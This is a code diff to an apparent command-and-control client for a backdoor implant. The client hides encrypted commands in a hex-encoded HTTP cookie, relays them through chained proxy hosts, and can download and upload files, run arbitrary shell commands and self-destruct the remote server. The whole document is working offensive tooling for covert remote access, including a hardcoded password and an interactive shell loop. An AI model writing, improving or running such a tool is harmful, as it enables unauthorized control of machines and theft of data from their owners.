@@ -70,14 +70,13 @@ def aes_decrypt(ciphertext):
 
 
 class PacketReq:
-    def __init__(self, auth_id: int, password: bytes, cmd_id: int, content: bytes):
-        self.auth_id = auth_id
+    def __init__(self, password: bytes, cmd_id: int, content: bytes):
         self.password = password
         self.cmd_id = cmd_id
         self.content = content
 
     def __bytes__(self):
-        return self.encrypt(p8(self.auth_id) + self.password + p8(self.cmd_id) + self.content)
+        return self.encrypt(self.password + p8(self.cmd_id) + self.content)
 
     def encrypt(self, plaintext: bytes) -> bytes:
         ciphertext = xor_crypt(plaintext)
@@ -87,13 +86,16 @@ class PacketReq:
 
 
 class PacketRes:
-    def __init__(self, ciphertext: bytes):
-        data = self.decrypt(ciphertext)
-        self.retv = int.from_bytes(data[:4], 'little', signed=True)
-        self.domain = data[4]
-        self.content = data[5:]
+    def __init__(self, retv: int, ciphertext: bytes):
+        self.retv = retv
+        self.content = b""
+        if retv >= 0:
+            self.content = self.decrypt(ciphertext)
 
     def decrypt(self, ciphertext: bytes) -> bytes:
+        if ciphertext == b"":
+            return b""
+
         ciphertext = aes_decrypt(ciphertext)
         plaintext = xor_crypt(ciphertext[:len(ciphertext)])
 
@@ -105,14 +107,14 @@ def encapsulate_proxies(host_list: list[tuple[str, int]], packet: PacketReq) -> 
         next_addr = host_list[i+1]
         content = socket.inet_aton(next_addr[0])
         port = socket.htons(next_addr[1]).to_bytes(2, 'little')
-        packet = PacketReq(0, packet.password, CMD_PROXY, content + port + bytes(packet))
+        packet = PacketReq(packet.password, CMD_PROXY, content + port + bytes(packet))
 
     return packet
 
 
 def decapsulate_proxies(host_list: list[tuple[str, int]], res: PacketRes) -> PacketRes:
     for _ in host_list[:-1]:
-        res.content = PacketRes(res.content).content
+        res.content = PacketRes(res.retv, res.content).content
 
     return res
 
@@ -142,25 +144,34 @@ def sendrecv(addr: tuple[str, int], sendbuf: bytes) -> bytes:
     hex_sendbuf = enhex(sendbuf)
     r = requests.get(f"http://{addr[0]}:{addr[1]}/", cookies={"SOCS": hex_sendbuf})
 
-    start = r.headers['Set-Cookie'].index("SOCS") + 5
-    end = r.headers['Set-Cookie'][start:].index(";") + 5
-    data = r.headers['Set-Cookie'][start:end]
+    retv = 0
+    unhex_recvbuf = b""
+    if r.status_code == 500:
+        retv = -1
+    elif r.status_code == 422:
+        print("[!] invalid command sent by client")
+    elif r.status_code == 200:
+        start = r.headers['Set-Cookie'].index("SOCS") + 5
+        end = r.headers['Set-Cookie'][start:].index(";") + 5
+        data = r.headers['Set-Cookie'][start:end]
 
-    unhex_recvbuf = unhex(data)
+        unhex_recvbuf = unhex(data)
 
-    return unhex_recvbuf
+    return retv, unhex_recvbuf
 
 
 def sendrecv_encapsulate(host_list: list[tuple[str, int]], original_packet: PacketReq) -> PacketRes:
     encap_packet_req: PacketReq = encapsulate_proxies(host_list, original_packet)
-    res_raw: bytes = sendrecv(host_list[0], bytes(encap_packet_req))
-    decap_packet_res: PacketRes = decapsulate_proxies(host_list, PacketRes(res_raw))
+    retv, res_raw = sendrecv(host_list[0], bytes(encap_packet_req))
+    decap_packet_res: PacketRes = decapsulate_proxies(host_list, PacketRes(retv, res_raw))
 
     return decap_packet_res
 
 
 def download(host_list: list[tuple[str, int]], password: bytes, filename: str):
-    packet = PacketReq(0, password, CMD_FILE_READ, filename.encode())
+    filename += "\x00"
+
+    packet = PacketReq(password, CMD_FILE_READ, filename.encode())
     rsp = sendrecv_encapsulate(host_list, packet)
 
     filename_flat = filename.replace("/", "__")
@@ -174,7 +185,7 @@ def upload(host_list: list[tuple[str, int]], password: bytes, filename_local: st
     with open(filename_local, "rb") as f:
         content = f.read()
 
-    req = PacketReq(0, password, CMD_FILE_WRITE, filename_remote.encode() + b"\x00" + content)
+    req = PacketReq(password, CMD_FILE_WRITE, filename_remote.encode() + b"\x00" + content)
     rsp = sendrecv_encapsulate(host_list, req)
 
     return rsp
@@ -188,21 +199,23 @@ def exec(host_list: list[tuple[str, int]], password: bytes, pwd: str, cmd: str):
     elif pwd == "":
         complete_cmd = cmd
 
-    req = PacketReq(0, password, CMD_FILE_EXEC, complete_cmd.encode())
+    complete_cmd += "\x00"
+
+    req = PacketReq(password, CMD_FILE_EXEC, complete_cmd.encode())
     rsp = sendrecv_encapsulate(host_list, req)
 
     return rsp
 
 
 def server_exit(host_list: list[tuple[str, int]], password):
-    req = PacketReq(0, password, CMD_EXIT, b"")
+    req = PacketReq(password, CMD_EXIT, b"")
     rsp = sendrecv_encapsulate(host_list, req)
 
     return rsp
 
 
 def main(argv):
-    password = b"password"
+    password = b"password\x00"
     pwd = os.path.abspath("/")
 
     # get all proxy
@@ -222,7 +235,9 @@ def main(argv):
         cmd_argv = input(prefix).strip(" ").split()
         if cmd_argv == []:
             continue
-        elif cmd_argv[0].lower() == "download":
+
+        cmd_bin = cmd_argv[0].lower()
+        if cmd_bin == "download":
             if len(cmd_argv) != 2:
                 print("usage: download <remote_path>\n")
                 continue
@@ -233,7 +248,7 @@ def main(argv):
                 continue
 
             print(f"[+] file successfully downloaded '{cmd_argv[1]}' from server to local (saved with flat filename in pwd)\n")
-        elif cmd_argv[0].lower() == "upload":
+        elif cmd_bin == "upload":
             if len(cmd_argv) != 3:
                 print("usage: upload <local_path> <remote_path>\n")
                 continue
@@ -244,7 +259,7 @@ def main(argv):
                 continue
 
             print(f"[+] successfully uploaded file '{cmd_argv[1]}' as '{cmd_argv[2]}' to server\n")
-        elif cmd_argv[0].lower() == "hosts":
+        elif cmd_bin == "hosts":
             hosts_usage = lambda: (
                 print("usage:"),
                 print("- hosts push <ip>:<port>"),
@@ -274,27 +289,26 @@ def main(argv):
 
                 host_list.pop(-1)
                 print(f"[+] successfully popped host {ip}:{port}\n")
-        elif cmd_argv[0].lower() == "[self-destruct]":
+        elif cmd_bin == "[self-destruct]":
             server_exit(host_list, password)
             print(f"[+] successfully self destructed server {host_list[-1]}\n")
             host_list.pop(-1)
-        elif cmd_argv[0].lower() == "cd":
+        elif cmd_bin == "cd":
             pwd_new = os.path.normpath(os.path.join(pwd, cmd_argv[1]))
             rsp = exec(host_list, password, "", f"test -d {pwd_new}")
-            if rsp.retv == 0x100:
+            if rsp.retv < 0:
                 print(f"[-] cannot access '{pwd_new}': No such file or directory\n")
+                continue
 
             pwd = pwd_new
-        elif cmd_argv[0].lower() == "exit":
+        elif cmd_bin == "exit":
             break
         else:
             cmd = ' '.join(cmd_argv)
             rsp = exec(host_list, password, pwd, cmd)
-            if rsp.retv == 0x7f00:
+            if rsp.retv < 0:
                 print(f"command not found (something went wrong): {cmd.split(' ')[0]}\n")
                 continue
-            elif rsp.retv != 0:
-                print(f"retv: {rsp.retv}, domain: {rsp.domain}\n")
 
             print(rsp.content.decode("utf-8", "backslashreplace"))
 
